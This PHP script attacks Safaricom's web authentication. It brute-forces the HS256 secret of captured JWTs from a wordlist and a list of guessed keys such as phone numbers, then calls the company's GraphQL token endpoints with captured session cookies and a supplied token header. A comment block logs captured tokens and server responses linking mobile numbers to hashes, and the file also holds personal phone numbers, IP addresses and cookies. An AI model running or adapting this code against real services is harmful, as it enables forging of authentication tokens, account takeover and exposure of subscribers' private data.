<?php
require 'vendor/autoload.php';

use Firebase\JWT\JWT;
use Firebase\JWT\Key;

$key = '7e500a9b415326678b77b3c2aa440c8202dc23e6123a842efdef4e39316268ac';
$payload = [
  "data" => [
    "msisdn" => "254716912002",
    "clientIp" => "105.167.127.219",
    "os" => "Windows 10.0",
    "source" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "platform" => "Microsoft Windows",
    "isMobile" => false,
    "isTablet" => false,
    "isDesktop" => true,
    "isIpod" => false,
    "isIphone" => false,
    "isAndroid" => false,
    "isBlackberry" => false,
    "isOpera" => false,
    "isIE" => false,
    "isEdge" => false,
    "isSafari" => false,
    "isFirefox" => false
  ],
  "iat" => 1687383689,
  "exp" => 1687556489

];

$wordList = file_get_contents('./jwt.secrets.list');

//$jwt = JWT::encode($payload, $key, 'HS256');
$array = convertWordListToArray($wordList, "\n");

$array = [
  "AzSCbw63g1R0nCw85jG8",
  "Iaya3yLKwmgvh7cF0q4",
  "254716912002",
  "0716912002",
  base64_decode('AXPrAJLC_LozKK-hVGoIJeNJeX3RDWV_pxAsDqtWsrA'),
  "AXPrAJLC_LozKK-hVGoIJeNJeX3RDWV_pxAsDqtWsrA",
  "BDOU99-h67HcA6JeFXHbSNMu7e2yNNu3RzoMj8TM4W88jITfq7ZmPvIM1Iv-4_l2LxQcYwhqby2xGpWwzjfAnG4",
  "5f72a51b-5c1a-4954-952a-32682bb66287",
  "30f80a7b-9ad4-4482-aa7a-280e79a3e6aa",
  "BCKzpBdTTgMsLeOtrSrZ20kJ1NCINUrveHjZg3cjk-DKeAP4u0Nu4LkGXmsYFu84js36EbyMdeNz7HzWi8XhYtU",
  "j8AUugWcICFJ6aEI-U-Qaw",
  "BEs7TLyGGMpHsyrTMcUxDA93Cgk-w8cMiTf9YkZcqlqX5nsiaA-a7BwZpEHzSLDGHllgXP5xq7XmgqvFEOGS5F4",
  "APA91bHVorDQVcGDQMTQizCS1k94ATGJ8O0R7sbpVsGh1H1NPjfKegbAYVvbBlU-m1VviBUZKbEuMs3Iht59nMdJbFlzMs1hQtq1SNjEeiej3Wo84EUEamK4Y7AhFuNcR3LqlNaUH40h",
  "esl-SsUdJRQyDUozaCfjFw",
  "esl-SsUdJRQyDUozaCfjFw:APA91bHVorDQVcGDQMTQizCS1k94ATGJ8O0R7sbpVsGh1H1NPjfKegbAYVvbBlU-m1VviBUZKbEuMs3Iht59nMdJbFlzMs1hQtq1SNjEeiej3Wo84EUEamK4Y7AhFuNcR3LqlNaUH40h",
  


];
//$array = convertWordListToArray($wordList,"|");
//$array = range(716911000, 716913000);

foreach ($array as $id => $key) {
  if (!is_string($key)) {
    $key = strval($key);
  }

  //$jwt = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7Im1zaXNkbiI6IjI1NDcxNjkxMjAwMiIsImNsaWVudElwIjoiMTA1LjE2Ny4xMjcuMjE5Iiwib3MiOiJXaW5kb3dzIDEwLjAiLCJzb3VyY2UiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE0LjAuMC4wIFNhZmFyaS81MzcuMzYiLCJwbGF0Zm9ybSI6Ik1pY3Jvc29mdCBXaW5kb3dzIiwiaXNNb2JpbGUiOmZhbHNlLCJpc1RhYmxldCI6ZmFsc2UsImlzRGVza3RvcCI6dHJ1ZSwiaXNJcG9kIjpmYWxzZSwiaXNJcGhvbmUiOmZhbHNlLCJpc0FuZHJvaWQiOmZhbHNlLCJpc0JsYWNrYmVycnkiOmZhbHNlLCJpc09wZXJhIjpmYWxzZSwiaXNJRSI6ZmFsc2UsImlzRWRnZSI6ZmFsc2UsImlzU2FmYXJpIjpmYWxzZSwiaXNGaXJlZm94IjpmYWxzZX0sImlhdCI6MTY4NzM4MzY4OSwiZXhwIjoxNjg3NTU2NDg5fQ.5IXLMlSnAaCs9ElvSuNVRJwM8z2vKZwo3gKpdVJUb0o';
  $jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7Im1zaXNkbiI6IjI1NDcxNjkxMjAwMiIsImNsaWVudElwIjoiMTA1LjE2MC45NS4xNjAiLCJvcyI6IldpbmRvd3MgMTAuMCIsInNvdXJjZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInBsYXRmb3JtIjoiTWljcm9zb2Z0IFdpbmRvd3MiLCJpc01vYmlsZSI6ZmFsc2UsImlzVGFibGV0IjpmYWxzZSwiaXNEZXNrdG9wIjp0cnVlLCJpc0lwb2QiOmZhbHNlLCJpc0lwaG9uZSI6ZmFsc2UsImlzQW5kcm9pZCI6ZmFsc2UsImlzQmxhY2tiZXJyeSI6ZmFsc2UsImlzT3BlcmEiOmZhbHNlLCJpc0lFIjpmYWxzZSwiaXNFZGdlIjpmYWxzZSwiaXNTYWZhcmkiOmZhbHNlLCJpc0ZpcmVmb3giOmZhbHNlfSwiaWF0IjoxNjg4MDQ1ODQ3LCJleHAiOjE2ODgyMTg2NDd9.fB39NpjPsvk1XeL6ak1ul8se9UDOqc6A614Tmtpjimw';
  try {
    $decoded = JWT::decode($jwt, new Key($key, 'HS256'));

    echo $id . '. good' . ' - KEY: ' . $key . PHP_EOL;
    break;
  } catch (Exception $e) {
    // If an error or exception is caught, echo "bad"
    echo $id . '. bad' . PHP_EOL;
  }
}


function myToken()
{
  $curl = curl_init();

  curl_setopt_array($curl, array(
    CURLOPT_URL => 'https://identity.safaricom.com/graphql?grant_type=client_credentials',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => '',
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => '{
    "query": "\\n            query GenerateToken{\\n                generateToken{\\n                  status\\n                  message\\n                  token \\n                }\\n            }\\n           "
 }',
    CURLOPT_HTTPHEADER => array(
      'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
      'Accept: application/json, text/plain, */*',
      'Content-Type: application/json',
      'DNT: 1',
      'sec-ch-ua-mobile: ?0',
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.360101',
      'sec-ch-ua-platform: "Windows"',
      'Sec-Fetch-Site: same-site',
      'Sec-Fetch-Mode: cors',
      'Sec-Fetch-Dest: empty',
      'host: identity.safaricom.com',
      //'Cookie: dtCookie=v_4_srv_3_sn_0A9306B63B9E78799A200569C5EF0832_perc_100000_ol_0_mul_1_app-3Aef3130cdf2794d94_0; incap_ses_1020_2516540=4wAdZqSLWjE1G1MGlMUnDo1Zk2QAAAAA9Gsu5BDlZLo/l2bb/I88jg==; incap_ses_1023_2353962=7gEgem6KhxIY84DyD24yDr1Xk2QAAAAAxZI8AEsjqTpz8p4efYdGgw==; incap_ses_1213_2353962=6AuQMWnFTBCbm4PzBHLVEABZk2QAAAAAIIGbR6e3SCqnDWJvncYWtg==; incap_ses_1342_2353962=xp7HF3RSyWaRGDA2rL6fErVNk2QAAAAAs0bdvm4KM2de+Hi2XRnyZQ==; incap_ses_1548_2516540=6qWmWrq+cS2djC8pPJp7FeFXk2QAAAAA03eEKVrqc7V5wPHgBx4Nfg==; incap_ses_777_2353962=wCdAWwcZZQVlfUycVnbICuNOk2QAAAAA+qE8Sf424fVzwryaEwoz6w==; nlbi_2353962=rckiSFq8wRiotdQXq+f5rwAAAAB9OecGhz6gUsLRmYuEKNoG; nlbi_2516540=vDfrW03Fe05F7SCy3rmYCAAAAADLbr0Rfk/O490oKBGJg5hj; visid_incap_2353962=VoWSZBAJQ+GNYSZpTeHn67RNk2QAAAAAQUIPAAAAAABVRDcw9+YreklUpZX7PUeK; visid_incap_2516540=Vdj+hce2SV2I4r+FXQSUmJBPk2QAAAAAQUIPAAAAAAAIl3ltvkR1EtiwnXMmtesb'
    ),
  ));

  $response = curl_exec($curl);

  curl_close($curl);
  return $response;
}

function hashVerif($token)
{
  $curl = curl_init();

  curl_setopt_array($curl, array(
    CURLOPT_URL => 'https://www.safaricom.com/graphql',
    CURLOPT_RETURNTRANSFER => true,
    //CURLOPT_ENCODING => '',
    //CURLOPT_MAXREDIRS => 10,
    //CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => '{"operationName":"GetToken","variables":{},"query":"query GetToken {\\n  getToken {\\n    status\\n    message\\n    mobileNumber\\n    proceed\\n    hash\\n    __typename\\n  }\\n}\\n"}',
    CURLOPT_HTTPHEADER => array(
      'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
      'hetoken: ' . $token,
      'DNT: 1',
      'sec-ch-ua-mobile: ?0',
      'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
      'content-type: application/json',
      'accept: */*',
      'apollo-require-preflight: true',
      'x-apollo-operation-name: true',
      'sec-ch-ua-platform: "Windows"',
      'Sec-Fetch-Site: same-origin',
      'Sec-Fetch-Mode: cors',
      'Sec-Fetch-Dest: empty',
      'host: www.safaricom.com',
      'Cookie: dtCookie=v_4_srv_3_sn_0A9306B63B9E78799A200569C5EF0832_perc_100000_ol_0_mul_1_app-3Aef3130cdf2794d94_0; incap_ses_1020_2516540=4wAdZqSLWjE1G1MGlMUnDo1Zk2QAAAAA9Gsu5BDlZLo/l2bb/I88jg==; incap_ses_1023_2353962=NOj/PEKsEzgE7InyD24yDtRkk2QAAAAAgnzqoVsmyCtn9QDMLVS3WQ==; incap_ses_1213_2353962=hMJIBqkXs0ZQZZnzBHLVEARvk2QAAAAAqvhQOfz6yHW01hrS1cmubA==; incap_ses_1342_2353962=xp7HF3RSyWaRGDA2rL6fErVNk2QAAAAAs0bdvm4KM2de+Hi2XRnyZQ==; incap_ses_1548_2516540=JS8YB/UT8FZWQEApPJp7FYhuk2QAAAAAuvrAZ0DH+zOfpwu3Labalg==; incap_ses_777_2353962=wCdAWwcZZQVlfUycVnbICuNOk2QAAAAA+qE8Sf424fVzwryaEwoz6w==; nlbi_2353962=Mo5eU6CWAG9EiSPIq+f5rwAAAAA1DB/xO/Z2sRwLZDehsFiA; nlbi_2516540=vDfrW03Fe05F7SCy3rmYCAAAAADLbr0Rfk/O490oKBGJg5hj; visid_incap_2353962=VoWSZBAJQ+GNYSZpTeHn67RNk2QAAAAAQUIPAAAAAABVRDcw9+YreklUpZX7PUeK; visid_incap_2516540=Vdj+hce2SV2I4r+FXQSUmJBPk2QAAAAAQUIPAAAAAAAIl3ltvkR1EtiwnXMmtesb; adobe_user_id=7e500a9b415326678b77b3c2aa440c8202dc23e6123a842efdef4e39316268ac; adobe_user_id.sig=SWqC6haH1OvonhPy55XniJpHQ4A; mySafaricomWorldProd=CYIVyjqMkx8cUVGd2n0pcyIXyYZoLv2e2f0uPrTdk914md8J0EKKoWf2MtCr7b%2BQguCDVJafroGKJ30C04jvOgfIWXN4O3tX0XNfMnmjIQJdA5kVRM1fGA%3D%3D%3BNjdcjtYUdutyjrakCC0kIMPhlijaKMeb'
    ),
  ));

  $response = curl_exec($curl);

  curl_close($curl);
  return $response;
}

function convertWordListToArray($wordList, $separator)
{
  $array = [];

  // Split the word list by line breaks
  $lines = explode($separator, $wordList);

  // Iterate through each line and trim any leading/trailing whitespace
  foreach ($lines as $line) {
    $line = trim($line);

    // Skip empty lines
    if (empty($line)) {
      continue;
    }

    // Add the line to the array
    $array[] = $line;
  }

  return $array;
}
/*
///////////////////////////////////////////////////////////////////
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7Im1zaXNkbiI6IjI1NDcxNjkxMjAwMiIsImNsaWVudElwIjoiMTA1LjE2MC40LjI1MiIsIm9zIjoiV2luZG93cyAxMC4wIiwic291cmNlIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwicGxhdGZvcm0iOiJNaWNyb3NvZnQgV2luZG93cyIsImlzTW9iaWxlIjpmYWxzZSwiaXNUYWJsZXQiOmZhbHNlLCJpc0Rlc2t0b3AiOnRydWUsImlzSXBvZCI6ZmFsc2UsImlzSXBob25lIjpmYWxzZSwiaXNBbmRyb2lkIjpmYWxzZSwiaXNCbGFja2JlcnJ5IjpmYWxzZSwiaXNPcGVyYSI6ZmFsc2UsImlzSUUiOmZhbHNlLCJpc0VkZ2UiOmZhbHNlLCJpc1NhZmFyaSI6ZmFsc2UsImlzRmlyZWZveCI6ZmFsc2V9LCJpYXQiOjE2ODc0NTE2MjMsImV4cCI6MTY4NzYyNDQyM30.PVkf7_OOrrmsvbHsK84FTeLQB-zBpoE7LKD816i1qpo
{
    "data": {
        "getToken": {
            "status": true,
            "message": "Retrieved your token successfully",
            "mobileNumber": "254716912002",
            "proceed": true,
            "hash": "7e500a9b415326678b77b3c2aa440c8202dc23e6123a842efdef4e39316268ac",
            "__typename": "MobileResult"
        }
    }
}

////////////////////////////////////////////
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7Im1zaXNkbiI6IjI1NDc5MzA2MDE2NCIsImNsaWVudElwIjoiMTA1LjE2MS4yMjUuNzAiLCJvcyI6IldpbmRvd3MgMTAuMCIsInNvdXJjZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInBsYXRmb3JtIjoiTWljcm9zb2Z0IFdpbmRvd3MiLCJpc01vYmlsZSI6ZmFsc2UsImlzVGFibGV0IjpmYWxzZSwiaXNEZXNrdG9wIjp0cnVlLCJpc0lwb2QiOmZhbHNlLCJpc0lwaG9uZSI6ZmFsc2UsImlzQW5kcm9pZCI6ZmFsc2UsImlzQmxhY2tiZXJyeSI6ZmFsc2UsImlzT3BlcmEiOmZhbHNlLCJpc0lFIjpmYWxzZSwiaXNFZGdlIjpmYWxzZSwiaXNTYWZhcmkiOmZhbHNlLCJpc0ZpcmVmb3giOmZhbHNlfSwiaWF0IjoxNjg3NTQ0NzgxLCJleHAiOjE2ODc3MTc1ODF9.cPX_tDeMAysvgQtSnPRfew4TiWfQRGxQ_tFFjfUbreg
{
    "data": {
        "getToken": {
            "status": true,
            "message": "Retrieved your token successfully",
            "mobileNumber": "254793060164",
            "proceed": true,
            "hash": "475c4384ceb5b11118952f7a523c599b2873507a54e44573826324646023fb92",
            "__typename": "MobileResult"
        }
    }
}
////////////////////////////////////////CHROME
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7Im1zaXNkbiI6IjI1NDc5MzA2MDE2NCIsImNsaWVudElwIjoiMTA1LjE2MS4yMjUuNzAiLCJvcyI6IldpbmRvd3MgMTAuMCIsInNvdXJjZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInBsYXRmb3JtIjoiTWljcm9zb2Z0IFdpbmRvd3MiLCJpc01vYmlsZSI6ZmFsc2UsImlzVGFibGV0IjpmYWxzZSwiaXNEZXNrdG9wIjp0cnVlLCJpc0lwb2QiOmZhbHNlLCJpc0lwaG9uZSI6ZmFsc2UsImlzQW5kcm9pZCI6ZmFsc2UsImlzQmxhY2tiZXJyeSI6ZmFsc2UsImlzT3BlcmEiOmZhbHNlLCJpc0lFIjpmYWxzZSwiaXNFZGdlIjpmYWxzZSwiaXNTYWZhcmkiOmZhbHNlLCJpc0ZpcmVmb3giOmZhbHNlfSwiaWF0IjoxNjg3NTQ2Nzk4LCJleHAiOjE2ODc3MTk1OTh9.dt9FQI78DKULpl5boCQ2fPIhCw4yUGJR15fztHdRXQw

////////////////////////////CMD
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7Im1zaXNkbiI6IjI1NDc5MzA2MDE2NCIsImNsaWVudElwIjoiMTA1LjE2MS4yMjUuNzAiLCJvcyI6IldpbmRvd3MgMTAuMCIsInNvdXJjZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInBsYXRmb3JtIjoiTWljcm9zb2Z0IFdpbmRvd3MiLCJpc01vYmlsZSI6ZmFsc2UsImlzVGFibGV0IjpmYWxzZSwiaXNEZXNrdG9wIjp0cnVlLCJpc0lwb2QiOmZhbHNlLCJpc0lwaG9uZSI6ZmFsc2UsImlzQW5kcm9pZCI6ZmFsc2UsImlzQmxhY2tiZXJyeSI6ZmFsc2UsImlzT3BlcmEiOmZhbHNlLCJpc0lFIjpmYWxzZSwiaXNFZGdlIjpmYWxzZSwiaXNTYWZhcmkiOmZhbHNlLCJpc0ZpcmVmb3giOmZhbHNlfSwiaWF0IjoxNjg3NTQ3MzIyLCJleHAiOjE2ODc3MjAxMjJ9.9DSMsx8jWLgGmX7qScWUsharvfYDiMCZEIOXGNxYSyc
token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7Im1zaXNkbiI6IjI1NDc5MzA2MDE2NCIsImNsaWVudElwIjoiMTA1LjE2MS4yMjUuNzAiLCJvcyI6IldpbmRvd3MgMTAuMCIsInNvdXJjZSI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNjEwMSIsInBsYXRmb3JtIjoiTWljcm9zb2Z0IFdpbmRvd3MiLCJpc01vYmlsZSI6ZmFsc2UsImlzVGFibGV0IjpmYWxzZSwiaXNEZXNrdG9wIjp0cnVlLCJpc0lwb2QiOmZhbHNlLCJpc0lwaG9uZSI6ZmFsc2UsImlzQW5kcm9pZCI6ZmFsc2UsImlzQmxhY2tiZXJyeSI6ZmFsc2UsImlzT3BlcmEiOmZhbHNlLCJpc0lFIjpmYWxzZSwiaXNFZGdlIjpmYWxzZSwiaXNTYWZhcmkiOmZhbHNlLCJpc0ZpcmVmb3giOmZhbHNlfSwiaWF0IjoxNjg3NTQ3Nzc3LCJleHAiOjE2ODc3MjA1Nzd9.Q4Ev8v4sm7RGrmfBwjWe4oxOWDMZANP4i9mce2HP4Kw
*/
